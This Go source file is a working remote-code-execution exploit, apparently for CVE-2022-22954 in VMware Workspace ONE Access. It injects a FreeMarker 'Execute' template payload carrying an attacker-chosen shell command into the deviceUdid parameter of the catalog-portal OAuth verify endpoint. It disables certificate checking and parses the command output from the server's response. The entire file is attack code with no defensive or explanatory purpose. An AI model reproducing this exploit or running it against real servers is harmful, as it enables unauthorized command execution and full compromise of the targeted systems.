package c22954

import (
	"fmt"
	urlparse "net/url"
	"os"
	"regexp"
	"strings"

	"github.com/imroc/req/v3"
)

func Start(url, cmd string) {
	exploit(url, cmd)

}

var Proxy_server = ""

func check(content string) bool {
	if strings.Contains(content, "console.log") {
		return true
	} else {
		return false
	}
}

func exploit(url, command string) {
	url = url + "/catalog-portal/ui/oauth/verify?code=&deviceType=&deviceUdid=%24%7b%22freemarker.template.utility.Execute%22%3fnew()(%22{command}%22)%7d"

	target := strings.Replace(url, "{command}", urlparse.QueryEscape(command), -1)
	// fmt.Println(target)
	client := req.C()
	client.EnableForceHTTP1()
	client.SetProxyURL(Proxy_server)
	client.EnableInsecureSkipVerify()
	// client.SetProxyURL("http://127.0.0.1:8080")
	resp, err := client.R().Get(target)
	if err != nil {
		println("[-] Connection err, please check the network.")
		os.Exit(0)
	}
	// fmt.Println(resp.String())
	if check(resp.String()) {
		reg := regexp.MustCompile(`id:(.*)device`)
		res := string(reg.FindAllString(resp.String(), -1)[0])
		res = strings.TrimRight(res, "\n, device")
		res = strings.TrimLeft(res, "id: ")
		res = strings.Replace(res, "\\n", "\n", -1)
		if res == "" {
			fmt.Println("[?] The exploit is successful but has no result.")
		} else {
			fmt.Printf("%s", res)
		}

	} else {
		fmt.Println("[-] Exploitation failure.")
	}
}
